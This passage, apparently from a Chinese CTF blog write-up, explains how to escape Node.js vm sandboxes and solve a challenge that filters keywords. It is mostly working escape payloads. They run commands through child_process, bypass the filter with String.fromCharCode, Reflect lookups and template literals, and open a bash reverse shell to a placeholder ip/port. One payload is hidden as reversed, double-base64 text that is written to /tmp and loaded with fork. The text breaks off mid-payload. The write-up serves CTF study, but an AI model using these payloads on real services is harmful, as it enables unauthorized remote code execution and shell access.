title="vm沙箱逃逸的一些其他情况"></a>vm沙箱逃逸的一些其他情况</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = <span class="string">`...`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello &#x27;</span> + res)</span><br></pre></td></tr></table></figure><p>我们现在的this为null，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性<code>arguments.callee.caller</code>，它可以返回函数的调用者。</p><p>我们上面演示的沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法，这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的<code>arguments.callee.caller</code>就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了。</p><p>用以下代码进行逃逸：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">const vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line">const script = </span><br><span class="line">`<span class="language-javascript">(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> a = &#123;&#125;</span></span><br><span class="line"><span class="language-javascript">    a.<span class="property">toString</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>))();</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>()</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> a</span></span><br><span class="line"><span class="language-javascript">  &#125;)()</span>`;</span><br><span class="line"></span><br><span class="line">const sandbox = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line">const context = <span class="keyword">new</span> vm.createContext(sandbox);</span><br><span class="line">const res = vm.runInContext(script, context);</span><br><span class="line">console.log(<span class="string">&#x27;Hello &#x27;</span> + res)</span><br></pre></td></tr></table></figure><p><img src="/img/image-20240330180408167.png" alt="image-20240330180408167"></p><p>我们来分析一下以上代码</p><p>我们在沙箱内先创建了一个对象，并且将这个对象的toString方法进行了重写，通过<code>arguments.callee.caller</code>获得到沙箱外的一个对象，利用这个对象的构造函数的构造函数返回了process，再调用process进行rce，沙箱外在console.log中通过字符串拼接的方式触发了这个重写后的toString函数。</p><p>详细解析：</p><blockquote><ol><li><code>(() =&gt; &#123; ... &#125;)()</code>: 这是一个立即执行函数表达式 (IIFE)，用于创建一个新的作用域并执行其中的代码块。</li><li><code>const a = &#123;&#125;</code>: 在函数内部定义了一个空对象 <code>a</code>，用于存储重写后的 <code>toString</code> 方法。</li><li><code>a.toString = function () &#123; ... &#125;</code>: 将对象 <code>a</code> 的 <code>toString</code> 方法重写为一个函数，这个函数中包含了一些逻辑。</li><li><code>const cc = arguments.callee.caller;</code>: 使用 <code>arguments.callee.caller</code> 获取当前调用函数的调用者。</li><li><code>const p = (cc.constructor.constructor(&#39;return process&#39;))();</code>: 通过调用者的构造函数构造了 <code>process</code> 对象的引用，并保存在变量 <code>p</code> 中。</li><li><code>return p.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()</code>: 通过 <code>p.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()</code> 获取当前用户的用户名，并将其作为字符串返回。</li><li><code>return a</code>: 返回重写后的对象 <code>a</code>。</li></ol></blockquote><p>如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，我们可以用<code>Proxy</code>来劫持属性</p><p><a href="https://juejin.cn/post/6844904090116292616">Proxy 和 Reflect - 掘金 (juejin.cn)</a></p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">const vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line">const script = </span><br><span class="line">`<span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">(<span class="function">() =&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>))();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> a</span></span><br><span class="line"><span class="language-javascript">&#125;)()</span></span><br><span class="line"><span class="language-javascript"></span>`;</span><br><span class="line">const sandbox = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line">const context = <span class="keyword">new</span> vm.createContext(sandbox);</span><br><span class="line">const res = vm.runInContext(script, context);</span><br><span class="line">console.log(res.abc)</span><br></pre></td></tr></table></figure><p><img src="/img/image-20240330181131868.png" alt="image-20240330181131868"></p><p>触发利用链的逻辑就是我们在<code>get:</code>这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。</p><p>但如果沙箱的返回值返回的是我们无法利用的对象或者没有返回值应该怎么进行逃逸呢？</p><p>我们可以借助异常，将沙箱内的对象抛出去，然后在外部输出：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">const vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line">const script = </span><br><span class="line">`<span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>))();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span>`;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    vm.runInContext(script, vm.createContext(<span class="built_in">Object</span>.create(<span class="literal">null</span>)));</span><br><span class="line">&#125;<span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    console.log(<span class="string">&quot;error:&quot;</span> + e) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后输出</p><p><img src="/img/image-20240330182752055.png" alt="image-20240330182752055"></p><p>这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。这段代码抛出异常的原因是脚本中的代理对象的 <code>get</code> 拦截器中存在错误。具体来说，<code>get</code> 拦截器中的操作试图访问 <code>caller</code> 属性，但 <code>caller</code> 属性在严格模式下不可用，因此会引发异常。有点像sql注入中的报错注入 😯 😯 😯</p><h3 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h3><p>vm沙箱隔离功能较弱，有很多逃逸的方法，所以第三方包vm2在vm的基础上做了一些优化，包括以下优化</p><p><img src="/img/20221118184410-ef77ed68-672d-1.png" alt="20221118184410-ef77ed68-672d-1"></p><ul><li><code>cli.js</code>实现了可以在命令行中调用vm2 也就是bin下的vm2。</li><li><code>contextify.js</code>封装了三个对象：<code>Contextify Decontextify propertyDescriptor</code>，并且针对global的Buffer类进行了代理。</li><li><code>main.js</code> 是vm2执行的入口，导出了<code>NodeVM VM</code>这两个沙箱环境，还有一个<code>VMScript</code>实际上是封装了<code>vm.Script</code>。</li><li><code>sandbox.js</code>针对global的一些函数和变量进行了拦截，比如<code>setTimeout，setInterval</code>等</li></ul><p>vm2相比vm做出很大的改进，其中之一就是利用了es6新增的proxy特性，从而使用钩子拦截对<code>constructor和__proto__</code>这些属性的访问。</p><h2 id="全世界最简单的CTF（vm2沙箱逃逸）"><a href="#全世界最简单的CTF（vm2沙箱逃逸）" class="headerlink" title="全世界最简单的CTF（vm2沙箱逃逸）"></a>全世界最简单的CTF（vm2沙箱逃逸）</h2><p>访问<code>/secret</code>路由得到源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"> </span><br><span class="line">app</span><br><span class="line">.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>))</span><br><span class="line">.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/public&#x27;</span>)))</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/home.html&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> pattern = <span class="regexp">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span>;</span><br><span class="line">    <span class="keyword">if</span>(code.<span class="title function_">match</span>(pattern))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;what can I say? hacker out!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> code = req.<span class="property">body</span>.<span class="property">code</span>;</span><br><span class="line">        <span class="keyword">let</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">let</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">waf</span>(code)</span><br><span class="line">            <span class="keyword">let</span> result = vm.<span class="title function_">runInContext</span>(code, context);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">message</span>);</span><br><span class="line">            <span class="built_in">require</span>(<span class="string">&#x27;./hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/secret&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(process.<span class="property">__filename</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(__filename, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(process.<span class="property">__filename</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listen on 3000&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>拿给gpt说是一个vm沙箱，那就是vm沙箱逃逸了，正常payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">     <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">         <span class="keyword">const</span> c = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">         <span class="keyword">const</span> p = (c.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>))();</span><br><span class="line">         <span class="keyword">return</span> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure><p>题目waf：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let pattern = /(process|<span class="string">\[.*?\]</span>|<span class="string">exec</span>|<span class="string">spawn</span>|<span class="string">Buffer</span>|<span class="string">\\</span>|<span class="string">\+</span>|<span class="string">concat</span>|<span class="string">eval</span>|<span class="string">Function)/g;</span></span><br></pre></td></tr></table></figure><p>过滤了<code>process</code>、<code>[...]</code>（方括号中的任意字符）、<code>exec</code>、<code>spawn</code>、<code>Buffer</code>、<code>\</code>（反斜杠）、<code>+</code>（加号）、<code>concat</code>、<code>eval</code>、<code>Function</code>，waf ban了中括号和加号，不能用拼接绕过；ban了eval；ban了<code>\</code>，不能用十六进制和unicode</p><h3 id="方法一：反射"><a href="#方法一：反射" class="headerlink" title="方法一：反射"></a>方法一：反射</h3><p>星盟的解：</p><p>用String.fromCharCode绕过process</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mainModule</span>.require(String.fromCharCode(<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>))</span><br></pre></td></tr></table></figure><blockquote><p>上行代码使用了 <code>mainModule.require</code> 方法，并传入了一个参数，参数值是通过 <code>String.fromCharCode</code> 函数生成的字符串。该字符串实际上是 <code>&#39;child_process&#39;</code> 的字符编码，因此 <code>mainModule.require</code> 的作用是加载 Node.js 的 <code>child_process</code> 模块，故上串代码也就相当于mainModule.require(‘child_process’)</p></blockquote><p>接下来就是用Reflect.get方法绕过exec，详细文章参考：<a href="https://www.anquanke.com/post/id/237032">https://www.anquanke.com/post/id/237032</a></p><p>Reflect.get(target, propertyKey[, receiver])的作用是获取对象身上某个属性的值，类似于target[name]。所以取eval函数的方式可以变成Reflect.get(global, Reflect.ownKeys(global).find(x&#x3D;&gt;x.includes(‘eval’)))</p><blockquote><ol><li><code>Reflect.ownKeys(global)</code> 返回了全局对象 <code>global</code> 自身的所有属性的键名组成的数组。</li><li><code>Array.prototype.find()</code> 方法遍历这个数组，找到第一个符合条件的属性键名，即包含 <code>&#39;eval&#39;</code> 字符串。</li><li><code>Reflect.get(global, ...)</code> 使用找到的属性键名作为参数，从全局对象 <code>global</code> 中获取对应属性的值。</li></ol></blockquote><p>但我们本质上其实是调用的eval函数底层的exec方法，const p &#x3D; (cc.constructor.constructor(‘return global’))();获取js里面的全局函数集合</p><p><img src="/img/image-20240331110927064.png" alt="image-20240331110927064"></p><p>const b &#x3D; Reflect.get(p, Reflect.ownKeys(p).find(x&#x3D;&gt;x.includes(‘pro’))).mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115));</p><blockquote><p>这段代码的目的是获取对象 <code>p</code> 中包含 <code>pro</code> 字符串的属性的值，并调用该属性值的 <code>mainModule.require()</code> 方法，传入特定的字符串<code>child_process</code>作为参数。简单来说就是调用<code>child_process</code></p></blockquote><p>最终思路：先调用集合中的键为process下面的mainModule.require(‘child_process’)的模块，Reflect.get(b, Reflect.ownKeys(b).find(x&#x3D;&gt;x.includes(‘ex’)))去找child_process底层的exec函数，再反弹shell。这道题是个无回显，怪不得当时输啥都不给我回显，输waf也不给我回显what can I say，我还以为环境出问题了😅，下次碰到就知道是无回显了</p><p>最终payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return global&#x27;</span></span>))();</span><br><span class="line">            <span class="keyword">const</span> b = <span class="title class_">Reflect</span>.<span class="title function_">get</span>(p, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(p).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;pro&#x27;</span>))).<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">get</span>(b, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(b).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;ex&#x27;</span>)))(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h3 id="方法二：fork函数、逆序、base64、模板字母量"><a href="#方法二：fork函数、逆序、base64、模板字母量" class="headerlink" title="方法二：fork函数、逆序、base64、模板字母量"></a>方法二：fork函数、逆序、base64、模板字母量</h3><p>Z3师傅的解：</p><p>把过滤掉的关键字可以用模板字面量绕过，例如</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">child_process转成(`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)</span><br><span class="line">.execSync转成[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`]  </span><br></pre></td></tr></table></figure><p>原理：</p><p><img src="/img/image-20240331113204328.png" alt="image-20240331113204328"></p><p>但是中括号 [ ]被waf了，所以想到child_process下面有5个函数</p><ol><li><strong>exec</strong>: 用于执行 shell 命令。</li><li><strong>execFile</strong>: 用于执行可执行文件。</li><li><strong>spawn</strong>: 用于生成新的进程。</li><li><strong>fork</strong>: 用于衍生新的 Node.js 子进程，类似于 <code>spawn</code>，但专门用于衍生 Node.js 子进程。</li><li><strong>execSync</strong>: 是 <code>exec</code> 函数的同步版本，用于同步执行 shell 命令。</li></ol><p>只剩下fork函数了，那么思路就是在上面poc基础上，通过fs进行文件写文件，然后用fork进行加载，为了逃逸waf，可以逆序内容，然后再反序过来，写入文件后再调用fork加载达到反弹shell，由于过滤了 + ，所以 base64 编码后有 + 号的要再编码一次<br>上述字符串包含了单引号或双引号，为了避免引号冲突， content 赋值要用 反引号括起来，</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const content=` 内容 ` </span><br></pre></td></tr></table></figure><p>故最终payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line"> <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">const</span> content = <span class="string">`;)&quot;&#x27;&#125;i-,hsab&#123;|&#125;d-,46esab&#123;|&#125;d-,46esab&#123;|&#125;=0TRqp0KBRUSwo0MidXODNGc5M0YqJ1MMJjVHpldBlmSrE0UhRXQDFmeG1WW,ohce&#123;&#x27; c- hsab&quot;(cexe;)&quot;ssecorp_dlihc&quot;(eriuqer = &#125; cexe &#123; tsnoc`</span>;</span><br><span class="line"><span class="keyword">const</span> reversedContent = content.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"> <span class="keyword">const</span> c = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line"> <span class="keyword">const</span> p = (c.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proces`</span>&#125;</span>s`</span>&#125;</span>`</span></span>))();</span><br><span class="line"> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFileSync</span>(<span class="string">&#x27;/tmp/test1.js&#x27;</span>, reversedContent);</span><br><span class="line">        <span class="keyword">return</span> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>).<span class="title function_">fork</span>(<span class="string">&#x27;/tmp/test1.js&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>content的值反序输出为：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const &#123; <span class="keyword">exec</span> &#125; = <span class="keyword">require</span>(<span class="string">&quot;child_process&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;bash -c &#x27;&#123;echo,WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M5cGNDOXdiM0owSURBK0pqRT0=&#125;|&#123;base64,-d&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M5cGNDOXdiM0owSURBK0pqRT<span class="number">0</span>=的解码为bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/ip/port <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>具体分析：</p><blockquote><ol><li><code>bash -c</code> 是 Bash 命令的一种用法，其中 <code>-c</code> 选项表示后面跟着的字符串是一个命令或者是一个要执行的命令字符串。</li><li><code>&#123;base64,-d&#125;</code>：使用 <code>base64</code> 命令进行反向解码，将前一个命令的输出（经过 Base64 编码的 Bash 代码）解码为原始的 Bash 代码。</li></ol></blockquote><h3 id="方法三：replace"><a href="#方法三：replace" class="headerlink" title="方法三：replace"></a>方法三：replace</h3><p>LaoGong真的nb</p><p>因为有try，可以抛出异常来逃逸，payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td 